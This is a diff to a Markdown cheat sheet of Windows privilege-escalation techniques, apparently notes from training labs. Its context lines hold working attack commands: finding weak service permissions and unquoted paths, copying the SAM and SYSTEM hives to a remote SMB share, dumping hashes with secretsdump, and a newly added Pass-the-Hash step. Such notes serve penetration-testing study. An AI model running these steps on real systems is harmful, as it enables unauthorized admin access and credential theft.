@@ -161,7 +161,7 @@ reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WindowsScheduler 
 ## Privilege Escalation with Insecure Permissions on Service Executable ✅
 
 > [!Note]
-> If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.
+> 🔹 If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.
 ```powershell
 1️⃣ # Check the configuration details of a particular service example ( BINARY_PATH_NAME and SERVICE_START_NAME and .. )
 sc qc WindowsScheduler # cmd
@@ -189,7 +189,7 @@ sc.exe start windowsscheduler # powershell
 ## Privilege Escalation with Unquoted Service Paths ✅
 
 > [!Note]
-> When a Windows service is set to use a specific executable file (") it must be inside the ("), especially if the route contains the space. If these quotes are not there, Windows When running the service, it cannot determine where the executable file is and may first look for other files that are on the way.
+> 🔹 When a Windows service is set to use a specific executable file (") it must be inside the ("), especially if the route contains the space. If these quotes are not there, Windows When running the service, it cannot determine where the executable file is and may first look for other files that are on the way.
 ```powershell
 1️⃣ # Check the configuration details of a particular service example ( BINARY_PATH_NAME and SERVICE_START_NAME and .. )
 sc qc WindowsScheduler # cmd
@@ -216,9 +216,9 @@ sc.exe start "disk sorter enterprise" # powershell
 ## Privilege Escalation with Insecure Service Permissions ✅
 
 > [!Note]
-> Another way to upgrade access to Windows is to check the level of access to services. If DACL (Discretionary Access Control List) a service allows ordinary users to change the service configuration, this vulnerability can be used to execute the desired code with high access level.
+> 🔹 Another way to upgrade access to Windows is to check the level of access to services. If DACL (Discretionary Access Control List) a service allows ordinary users to change the service configuration, this vulnerability can be used to execute the desired code with high access level.
 > [!Note]
-> We must first check if a particular service is allowed permission to change by normal users. To do this, we use the [Accessch](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) tool using the Sysinternals set. ( BUILTIN\Users : SERVICE_ALL_ACCESS )
+> 🔹 We must first check if a particular service is allowed permission to change by normal users. To do this, we use the [Accessch](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) tool using the Sysinternals set. ( BUILTIN\Users : SERVICE_ALL_ACCESS )
 ```powershell
 1️⃣ # Check the permission service with accesschk Tools
 accesschk64.exe -qlc thmservice
@@ -248,10 +248,10 @@ sc.exe start "THMService" # powershell
 > [!Note]
 > 🔹 Access Privileges in Windows are licenses that allow a system to do systemic tasks. These licenses can vary from simple (such as off -system shutdown) to very sensitive (such as ignoring security controls).
 
-## Privilege Escalation with The SeBackup and SeRestore privileges allow ✅
+### Privilege Escalation with The SeBackup and SeRestore privileges allow ✅
 
 > [!Note]
-> The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges. Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.
+> 🔹 The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges. Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.
 ```powershell
 0️⃣ Once on the command prompt, we can check our privileges
 whoami /priv
@@ -266,7 +266,10 @@ copy C:\Users\THMBackup\sam.hive \\10.11.99.141\public\
 copy C:\Users\THMBackup\system.hive \\10.11.99.141\public\
 4️⃣ Extraction of password hashs from registry files with impacket secretsdump tools
 sudo python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+5️⃣ Pass-the-Hash attack to log in as Administrator
 
+
+```
 
 ## Credentials ✅
 ## File-Unattended ✅
@@ -335,7 +338,7 @@ schtasks /run /tn vulntask
 ## AlwaysInstallElevated ✅
 
 > [!Note]
-> "AlwaysInstallElevated" is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the "AlwaysInstallElevated" registry key is configured with a value of "1" in the Windows Registry.
+> 🔹 "AlwaysInstallElevated" is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the "AlwaysInstallElevated" registry key is configured with a value of "1" in the Windows Registry.
 When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn't have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.
 ```powershell
 1️⃣ # Check the value of Alwaysinstallelelevated in Windows Registry setting if both keys is 1, the system is vulnerable.
